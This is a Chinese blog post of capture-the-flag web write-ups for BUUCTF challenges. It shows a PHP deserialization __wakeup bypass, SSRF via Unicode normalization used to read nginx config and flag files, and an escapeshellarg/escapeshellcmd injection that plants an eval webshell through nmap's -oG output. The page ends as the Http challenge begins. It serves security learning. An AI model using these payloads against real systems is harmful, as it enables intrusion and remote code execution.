<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUUCTF刷题笔记（三） | A2u13's Blog</title><meta name="description" content="题目列表：  [极客大挑战 2019]PHP [极客大挑战 2019]Knife [SUCTF 2019]Pythonginx [BUUCTF 2018]Online Tool [极客大挑战 2019]Http [极客大挑战 2019]LoveSQL [ZJCTF 2019]NiZhuanSiWei [CISCN2019 华北赛区 Day1 Web1]Dropbox    [极客大挑战 2019"><meta name="keywords" content="BUUCTF"><meta name="author" content="A2u13"><meta name="copyright" content="A2u13"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/favicon.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="http://ta.qq.com"/><link rel="dns-prefetch" href="http://ta.qq.com"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="BUUCTF刷题笔记（三）"><meta name="twitter:description" content="题目列表：  [极客大挑战 2019]PHP [极客大挑战 2019]Knife [SUCTF 2019]Pythonginx [BUUCTF 2018]Online Tool [极客大挑战 2019]Http [极客大挑战 2019]LoveSQL [ZJCTF 2019]NiZhuanSiWei [CISCN2019 华北赛区 Day1 Web1]Dropbox    [极客大挑战 2019"><meta name="twitter:image" content="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><meta property="og:type" content="article"><meta property="og:title" content="BUUCTF刷题笔记（三）"><meta property="og:url" content="https://a2u13.com/2020/02/13/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/"><meta property="og:site_name" content="A2u13's Blog"><meta property="og:description" content="题目列表：  [极客大挑战 2019]PHP [极客大挑战 2019]Knife [SUCTF 2019]Pythonginx [BUUCTF 2018]Online Tool [极客大挑战 2019]Http [极客大挑战 2019]LoveSQL [ZJCTF 2019]NiZhuanSiWei [CISCN2019 华北赛区 Day1 Web1]Dropbox    [极客大挑战 2019"><meta property="og:image" content="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><meta property="article:published_time" content="2020-02-13T13:53:05.000Z"><meta property="article:modified_time" content="2020-06-07T06:50:29.676Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
var t = Cookies.get("theme")
if (autoChangeMode == '1'){
  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined){
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport){
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour < 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
  }
  } else if (t == 'light') activateLightMode()
  else activateDarkMode()

} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="canonical" href="https://a2u13.com/2020/02/13/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/"><link rel="prev" title="BUUCTF刷题笔记（四）" href="https://a2u13.com/2020/02/15/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/"><link rel="next" title="BUUCTF刷题笔记（二）" href="https://a2u13.com/2020/02/12/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"><script src="https://tajs.qq.com/stats?sId=&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=66562096&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;" charset="UTF-8"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://a2u13.com/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: true,
  fancybox: false,
  Snackbar: {"bookmark":{"message_prev":"按","message_next":"键将本页加入书签"},"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
  baiduPush: false,
  highlightCopy: true,
  highlightLang: false,
  highlightShrink: 'false',
  isFontAwesomeV5: false,
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
  
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isSidebar: true  
  }</script><noscript><style>
#page-header {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="A2u13's Blog" type="application/atom+xml">
</head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/4A56A073590349364F32B58397E8B06C.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">33</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">22</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">15</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#极客大挑战-2019-PHP"><span class="toc-number">1.</span> <span class="toc-text">[极客大挑战 2019]PHP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#极客大挑战-2019-Knife"><span class="toc-number">2.</span> <span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2019-Pythonginx"><span class="toc-number">3.</span> <span class="toc-text">[SUCTF 2019]Pythonginx</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">4.</span> <span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#极客大挑战-2019-Http"><span class="toc-number">5.</span> <span class="toc-text">[极客大挑战 2019]Http</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#极客大挑战-2019-LoveSQL"><span class="toc-number">6.</span> <span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-number">7.</span> <span class="toc-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN2019-华北赛区-Day1-Web1-Dropbox"><span class="toc-number">8.</span> <span class="toc-text">[CISCN2019 华北赛区 Day1 Web1]Dropbox</span></a></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="photo"></div><div class="post-bg" id="nav" style="background-image: url(https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">A2u13's Blog</a></span><span class="pull_right menus"><div id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">BUUCTF刷题笔记（三）</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2020-02-13 21:53:05"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2020-02-13</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2020-06-07 14:50:29"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-06-07</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"> <span class="post-meta-wordcount"><i class="post-meta__icon fa fa-file-word-o" aria-hidden="true"></i><span>字数总计:</span><span class="word-count">3.8k</span><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-clock-o" aria-hidden="true"></i><span>阅读时长: 18 分钟</span></span></div><div class="meta-thirdline"><span class="post-meta-pv-cv"></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212161847.png" alt=""></p>
<p><strong>题目列表：</strong></p>
<ul>
<li>[极客大挑战 2019]PHP</li>
<li>[极客大挑战 2019]Knife</li>
<li>[SUCTF 2019]Pythonginx</li>
<li>[BUUCTF 2018]Online Tool</li>
<li>[极客大挑战 2019]Http</li>
<li>[极客大挑战 2019]LoveSQL</li>
<li>[ZJCTF 2019]NiZhuanSiWei</li>
<li>[CISCN2019 华北赛区 Day1 Web1]Dropbox</li>
</ul>
<a id="more"></a>

<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213220458.png" alt=""></p>
<p>直接盲猜备份文件为<code>www.zip</code></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213220556.png" alt=""></p>
<p>然后发现是假的。。。</p>
<p>查看<code>index.php</code>的代码</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213221006.png" alt=""></p>
<p>看到<code>class.php</code>文件代码</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213220727.png" alt=""></p>
<p>主要考了反序列化以及<code>__wakeup</code>的绕过</p>
<p><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html" target="_blank" rel="noopener">php反序列化漏洞绕过魔术方法 __wakeup</a></p>
<p>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</p>
<p><code>O:6:&quot;sercet&quot;:1:</code>也就是输入比<code>1</code>大的值就行  如<code>O:6:&quot;sercet&quot;:2:</code></p>
<p>首先生成序列化字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'admin'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Name();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">" Name username"</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>;s:<span class="number">14</span>:<span class="string">" Name password"</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>然后修改成员个数大于<code>2</code>即可</p>
<p>最后传过去即可</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213221908.png" alt=""></p>
<h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213222608.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200213222618.png" alt=""></p>
<p>背景是黑的差点以为做错了。。。</p>
<h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><p>打开看到题目源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure>

<p>这道题原型来自于<code>BlackHat</code>议会的一个分享</p>
<p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214140438.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214140512.png" alt=""></p>
<p><a href="https://bugs.python.org/issue36216" target="_blank" rel="noopener">CVE-2019-9636：urlsplit 不处理 NFKC 标准化</a></p>
<p><a href="https://towardsdatascience.com/difference-between-nfd-nfc-nfkd-and-nfkc-explained-with-python-code-e2631f96ae6c" target="_blank" rel="noopener">Difference Between NFD, NFC, NFKD, and NFKC Explained with Python Code</a></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214141415.png" alt=""></p>
<p><a href="https://bugs.python.org/issue36742" target="_blank" rel="noopener">CVE-2019-10160：urlsplit NFKD 标准化漏洞</a></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214141443.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214141801.png" alt=""></p>
<p>大致意思是<code>urlsplit</code>函数不处理<code>NFKC</code>标准化的字符，如果存在<code>NFKC</code>标准化字符的话，他会对字符不再处理</p>
<p>对于这道题而言，如果传入的<code>url</code>为<code>http://suctf.c℆</code>时，<code>urlsplit</code>函数会认为传入的<code>host</code>部分为<code>suctf.c</code>从而绕过前面的两个<code>host</code>不能为<code>suctf.cc</code>的限制</p>
<p>然后在<code>IDNA</code>编码的作用下重新变成<code>http://suctf.cc/u</code>，满足<code>host=suctf.cc</code>的条件</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214142344.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>,<span class="number">65537</span>):    </span><br><span class="line">    tmp=chr(i)    </span><br><span class="line">    <span class="keyword">try</span>:        </span><br><span class="line">        res = tmp.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>)        </span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"-"</span>) <span class="keyword">in</span> res:            </span><br><span class="line">            <span class="keyword">continue</span>        </span><br><span class="line">        print(<span class="string">"U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; "</span>.format(tmp, res, i))    </span><br><span class="line">    <span class="keyword">except</span>:        </span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>这里找到别人写的脚本，可以从所有的<code>unicode</code>以及他的<code>IDNA</code>编码形式的字符</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214144824.png" alt=""></p>
<p>这道题提到了<code>nginx</code>应该是要我们来读<code>nginx</code>的配置文件，而且提到了不要为<code>suctf.cc</code>担心</p>
<p>猜测存在<code>根目录/suctf.cc/...........</code>的目录存在或者别名之类的</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">配置文件存放目录：<span class="meta-keyword">/etc/</span>nginx</span><br><span class="line">主配置文件：<span class="meta-keyword">/etc/</span>nginx<span class="meta-keyword">/conf/</span>nginx.conf</span><br><span class="line">管理脚本：<span class="meta-keyword">/usr/</span>lib64<span class="meta-keyword">/systemd/</span>system/nginx.service</span><br><span class="line">模块：<span class="meta-keyword">/usr/</span>lisb64<span class="meta-keyword">/nginx/</span>modules</span><br><span class="line">应用程序：<span class="meta-keyword">/usr/</span>sbin/nginx</span><br><span class="line">程序默认存放位置：<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/nginx/</span>html</span><br><span class="line">日志默认存放位置：<span class="meta-keyword">/var/</span>log/nginx</span><br><span class="line">配置文件目录为：<span class="meta-keyword">/usr/</span>local<span class="meta-keyword">/nginx/</span>conf/nginx.conf</span><br></pre></td></tr></table></figure>

<p>这里得靠<code>file</code>协议来读配置文件内容</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214145227.png" alt=""></p>
<p>读到了<code>flag</code>的位置，直接读到<code>flag</code></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214145317.png" alt=""></p>
<p><strong>这道题在比赛中的时候，是当时<code>Black Hat</code>议会的一个内容，以及<code>python-CVE</code>，想做出来这道题的话，得多关注最近的安全议会的内容，多总结和学习，这样才能不落后，不学习题都做不来…….</strong></p>
<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题是考命令注入的，主要问题出在<code>escapeshellarg</code>和<code>escapeshellcmd</code>函数一起使用不当会导致多个参数的注入问题</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214180805.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214180828.png" alt=""></p>
<p>同时官方文档提示了警告⚠️</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214180858.png" alt=""></p>
<p><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html" target="_blank" rel="noopener">谈escapeshellarg绕过与参数注入漏洞</a></p>
<p>举个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host = <span class="string">"127.0.0.1' -s -h '"</span>;</span><br><span class="line">$host = escapeshellarg($host);</span><br><span class="line"><span class="keyword">echo</span> $host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;\n"</span>;</span><br><span class="line">$host = escapeshellcmd($host);</span><br><span class="line"><span class="keyword">echo</span> $host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;\n"</span>;</span><br><span class="line">$sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">chdir($sandbox);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214181526.png" alt=""></p>
<p><code>127.0.0.1&#39; -s -h &#39;</code>在经过<code>escapeshellarg</code>函数处理后</p>
<p>变成了<code>&#39;127.0.0.1&#39;\&#39;&#39; -h &#39;\&#39;&#39;&#39;</code></p>
<p>这里可以看到对<code>I地址P</code>后面的单引号进行了转义，同样对语句最后的单引号进行了转义</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">' -----&gt; '\''</span><br></pre></td></tr></table></figure>

<p>最后给整条语句包裹上一对单引号结束</p>
<p><code>&#39;127.0.0.1&#39;\&#39;&#39; -h &#39;\&#39;&#39;&#39;</code>这条语句经过<code>escapeshellcmd</code>函数处理后</p>
<p>变成了<code>&#39;127.0.0.1&#39;\\&#39;&#39; -h &#39;\\&#39;&#39;&#39;</code></p>
<p>对斜杠进行了转义，但问题出现在这里</p>
<p>此时的完整<code>shell语句</code>为：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F '127.0.0.1'\\'' -h '\\'''</span><br></pre></td></tr></table></figure>

<p>此时由于斜杠被转义，导致后面的单引号没有被转义，和他后面的单引号组成了<code>&#39;&#39;</code>，形成了空白字符，后面部分同理</p>
<p>导致最后被扫描的<code>Ip</code>为<code>127.0.0.1\</code></p>
<p>但如果是命令执行的连接符号，比如<code>&amp;、||、;、&amp;&amp;</code>会被强制加斜杠导致不可利用，这时候可以考虑从<code>Nmap</code>本身的输出入手</p>
<p>查询<code>Nmap</code>的所有输出参数</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214182808.png" alt=""></p>
<p>可以使用<code>-oG</code>参数，其他参数使用有问题</p>
<p>比如<code>-oN</code>参数会出现这种情况导致不可利用</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214184027.png" alt=""></p>
<p>那么可以按照上面原理写<code>payload</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">?host=' <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[a]);<span class="meta">?&gt;</span></span> -oG a2u13.php '</span><br></pre></td></tr></table></figure>

<p>这里给了<code>sandbox</code>的目录，就可以拿到<code>flag</code>了</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214184351.png" alt=""></p>
<h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200214190136.png" alt=""></p>
<p>看网页源代码得到一个超链接<code>Secret.php</code></p>
